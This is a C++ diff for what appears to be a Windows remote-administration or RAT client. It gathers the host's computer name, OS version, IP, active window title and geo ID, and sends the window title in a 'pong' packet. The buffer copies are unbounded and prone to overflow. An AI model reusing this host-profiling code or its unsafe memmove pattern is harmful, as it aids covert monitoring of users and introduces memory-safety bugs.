@@ -25,23 +25,33 @@ void util::Trim(wchar_t *src, int index, wchar_t *dst) {
 void util::InitRetrieveInfo(struct INFO *info) {
     wchar_t computer_name[32];
     event_handler::GetComputerName(computer_name);
-    wcscpy(info->computer_name, computer_name);
+    char computer_name_[64];
+    WcharToChar(computer_name_, computer_name);
+    memmove(info->computer_name, computer_name_, sizeof(computer_name_));
 
     wchar_t os_version[16];
     event_handler::GetOsVersion(os_version);
-    wcscpy(info->os_version, os_version);
+    char os_version_[32];
+    WcharToChar(os_version_, os_version);
+    memmove(info->os_version, os_version_, sizeof(os_version_));
 
     wchar_t local_ip[16];
     event_handler::GetIp(local_ip);
-    wcscpy(info->ip_address, local_ip);
+    char local_ip_[32];
+    WcharToChar(local_ip_, local_ip);
+    memmove(info->ip_address, local_ip_, sizeof(local_ip_));
 
-    wchar_t active_window[256];
+    wchar_t active_window[128];
     event_handler::GetActiveWindow(active_window);
-    wcscpy(info->window_title, active_window);
+    char active_window_[256];
+    WcharToChar(active_window_, active_window);
+    memmove(info->window_title, active_window_, sizeof(active_window_));
 
     wchar_t geo_id[8];
     event_handler::GetGeoId(geo_id);
-    wcscpy(info->geo_id, geo_id);
+    char geo_id_[16];
+    WcharToChar(geo_id_, geo_id);
+    memmove(info->geo_id, geo_id_, sizeof(geo_id_));
 }
 
 void util::MakePong(packet *packet_) {
@@ -53,8 +63,20 @@ void util::MakePong(packet *packet_) {
 
     wchar_t window_title[128];
     event_handler::GetActiveWindow(window_title);
-    packet_->set_data(window_title);
+    char window_title_[256];
+    WcharToChar(window_title_, window_title);
+    packet_->set_data(window_title_);
 
     packet_->set_current_index(0);
     packet_->set_final_index(0);
+}
+
+void util::CharToWchar(wchar_t *dest, char *src) {
+    int w_size = MultiByteToWideChar(CP_UTF8, 0, src, -1, NULL, NULL);
+    MultiByteToWideChar(CP_UTF8, 0, src, strlen(src) + 1, dest, w_size);
+}
+
+void util::WcharToChar(char *dest, wchar_t *src) {
+    int c_size = WideCharToMultiByte(CP_UTF8, 0, src, -1, NULL, 0, NULL, NULL);
+    WideCharToMultiByte(CP_UTF8, 0, src, -1, dest, c_size, NULL, NULL);
 }
